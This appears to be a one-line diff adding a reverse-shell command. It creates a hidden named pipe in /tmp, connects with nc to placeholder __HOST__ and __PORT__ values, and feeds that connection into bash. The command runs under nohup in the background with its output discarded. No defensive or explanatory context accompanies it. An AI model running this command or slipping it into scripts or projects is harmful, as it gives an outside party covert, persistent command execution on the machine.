@@ -1,0 +1,1 @@
+/usr/bin/nohup /bin/bash -c "mkfifo /tmp/.goporting;nc __HOST__ __PORT__ 0</tmp/.goporting | /bin/bash | tee /tmp/.goporting &" >/dev/null
